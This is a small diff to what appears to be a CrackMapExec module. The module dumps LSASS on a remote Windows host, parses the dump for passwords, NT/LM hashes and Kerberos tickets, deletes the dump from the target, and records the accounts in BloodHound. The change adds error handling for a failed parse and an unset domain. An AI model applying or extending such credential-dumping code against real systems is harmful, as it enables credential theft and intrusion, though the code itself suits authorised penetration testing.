@@ -56,12 +56,18 @@ class CMEModule:
         if dumper is None:
             context.log.error("Unable to load dump method '{}'".format(self.method))
             return False
+
         file = dumper.dump()
         if file is None:
             context.log.error("Unable to dump lsass")
             return False
 
-        credentials, tickets = Parser(file).parse()
+        parsed = Parser(file).parse()
+        if parsed is None:
+            context.log.error("Unable to parse lsass dump")
+            return False
+        credentials, tickets = parsed
+
         file.close()
         ImpacketFile.delete(session, file.get_file_path())
         if credentials is None:
@@ -79,6 +85,7 @@ class CMEModule:
         if len(credentials) == 0:
             context.log.info("No credentials found")
         credz_bh = []
+        domain = None
         for cred in credentials:
             domain = cred["domain"]
             if "." not in cred["domain"] and cred["domain"].upper() in connection.domain.upper():
@@ -86,7 +93,8 @@ class CMEModule:
             self.save_credentials(context, connection, cred["domain"], cred["username"], cred["password"], cred["lmhash"], cred["nthash"])
             self.print_credentials(context, cred["domain"], cred["username"], cred["password"], cred["lmhash"], cred["nthash"])
             credz_bh.append({'username': cred["username"].upper(), 'domain': domain.upper()})
-        add_user_bh(credz_bh, domain, context.log, connection.config)
+        if domain is not None:
+            add_user_bh(credz_bh, domain, context.log, connection.config)
 
     @staticmethod
     def print_credentials(context, domain, username, password, lmhash, nthash):
